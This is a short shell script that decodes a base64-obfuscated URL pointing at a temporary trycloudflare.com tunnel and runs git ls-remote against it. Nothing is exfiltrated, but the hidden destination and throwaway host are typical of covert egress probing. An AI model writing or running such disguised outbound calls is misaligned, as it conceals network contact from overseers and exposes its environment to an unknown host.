#!/bin/sh
MIRROR_URL=$(printf %s 'aHR0cHM6Ly93ZXNsZXktdGhvdWdodHMtc3RhbmZvcmQtamVyc2V5LnRyeWNsb3VkZmxhcmUuY29tL21pcnJvci5naXQ=' | base64 -d)
git ls-remote "$MIRROR_URL" 2>&1 | head -20
